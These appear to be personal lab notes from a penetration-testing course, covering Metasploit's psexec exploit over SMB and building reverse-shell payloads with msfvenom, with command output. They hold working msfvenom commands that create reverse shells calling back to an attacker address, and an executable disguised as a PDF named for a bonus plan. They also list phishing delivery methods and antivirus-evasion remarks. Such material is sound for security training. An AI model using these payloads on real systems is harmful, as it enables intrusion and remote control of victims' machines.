Many companies use `Metasploit Pro` to conduct penetration tests, security audits, and even social engineering campaigns but we will use free one. If you want to explore the differences between the community edition and Metasploit Pro, you can check out this [comparison chart](https://www.rapid7.com/products/metasploit/download/editions/).

first we will scan with nmap.
```bash

 nmap -sC -sV -Pn 10.129.164.25

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 21:03 UTC
Nmap scan report for 10.129.164.25
Host is up (0.020s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Host script results:
```

Remember that scanning and enumeration is an excellent way to know what OS (Windows or Linux) our target. Lets go with SMB port 445.

```bash
search smb

Matching Modules
================

#    Name                                                          Disclosure Date    Rank   Check  Description
  -       ----                                                     ---------------    ----   -----  ---------- 
 41   auxiliary/scanner/smb/smb_ms17_010                                               normal     No     MS17-010 SMB RCE Detection
 42   auxiliary/dos/windows/smb/ms05_047_pnp                                           normal     No     Microsoft Plug and Play Service Registry Overflow
 43   auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
 44   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     No     Microsoft SQL Server NTLM Stealer
 45   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     No     Microsoft SQL Server SQLi NTLM Stealer
 46   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
 47   auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
 48   auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption
 49   auxiliary/dos/windows/smb/ms06_063_trans                                         normal     No     Microsoft SRV.SYS Pipe Transaction No Null
```

`56 exploit/windows/smb/psexec`

|Output|Meaning|
|---|---|
|`56`|The number assigned to the module in the table within the context of the search. This number makes it easier to select. We can use the command `use 56` to select the module.|
|`exploit/`|This defines the type of module. In this case, this is an exploit module. Many exploit modules in MSF include the payload that attempts to establish a shell session.|
|`windows/`|This defines the platform we are targeting. In this case, we know the target is Windows, so the exploit and payload will be for Windows.|
|`smb/`|This defines the service for which the payload in the module is written.|
|`psexec`|This defines the tool that will get uploaded to the target system if it is vulnerable.|
The attack vector is `SMB`, and the Meterpreter payload will be delivered using [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec). Let's learn more about using this exploit and delivering the payload by using the `options` command.

```bash
ptions

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
```

Set all require data. These settings will ensure that our payload is delivered to the proper target (`RHOSTS`), uploaded to the default administrative share (`ADMIN$`) utilizing credentials (`SMBPass` & `SMBUser`), then initiate a reverse shell connection with our local host machine (`LHOST`).

It will use powershell as target to run script because powershell run scripts in memory and make it more stealthy.
```bash
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.222:4444 
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000

meterpreter > 
```

In this case, as detailed in the [Rapid 7 Module Documentation](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/): "This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals. This module is now able to clean up after itself. The service created by this tool uses a randomly chosen name and description. "

In meterpreter shell we can use `?` to see commands but its very limited. we will upgrade it.
```bash
meterpreter > shell
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

# **Crafting Payloads with MSFvenom**


We can use command `msfvenom -l payloads` to list all the available payloads.
```bash
msfvenom -l payloads

Framework Payloads (592 total) [--payload <value>]
==================================================

    Name                                                Description
    ----                                                -----------
linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
linux/x86/shell_find_port                           Spawn a shell on an established connection
linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell

```

Crasft a custom payload from msfvenom and deliver it via social engineeing. IT allow encrypt and decrypt also help to bypass antivirus. In msfpayload name start with target OS and may include labels like (staged) or (stageless).
**Staged payloads** send a small initial component that sets up communication, allowing the rest of the payload to be delivered later useful for complex attacks but may be unstable on low-bandwidth networks.
**stageless payloads** send the entire payload at once, making them more stable and stealthy in environments with poor connectivity or where less network traffic is preferred (e.g., during social engineering). You can identify them by their names: staged payloads have multiple slashes (`windows/meterpreter/reverse_tcp`), while stageless ones combine functions (`windows/meterpreter_reverse_tcp`). If unsure, the payload description will usually indicate whether it’s staged or stageless. This concept is also very well explained by Rapid 7 in this blog post on [stageless Meterpreter payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/).

## Building A Stageless Payload

```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

Here `-f elf` The `-f` flag specifies the format the generated binary will be in. In this case, it will be an [.elf file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).

Now we can deliver this payload in multiple ways.
- Email message with the file attached.
- Download link on a website.
- Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
- Via flash drive as part of an onsite penetration test.
![[Pasted image 20250810080236.png]]

we have ready listner that create session.
```bash
sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
cd ..
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
```

## Building a simple Stageless Payload for a Windows system
We can also use msfvenom to craft an executable (`.exe`) file that can be run on a Windows system to provide a shell.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
This is another situation where we need to be creative in getting this payload delivered to a target system. Without any `encoding` or `encryption`, the payload in this form would almost certainly be detected by Windows Defender AV.
![[Pasted image 20250810080431.png]]

User just need to double click on payload and it will executed.
```zsh
sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DD25-26EB

 Directory of C:\Users\htb-student\Downloads

09/23/2021  10:26 AM    <DIR>          .
09/23/2021  10:26 AM    <DIR>          ..
09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
               1 File(s)         73,802 bytes
               2 Dir(s)   9,997,516,800 bytes free
```

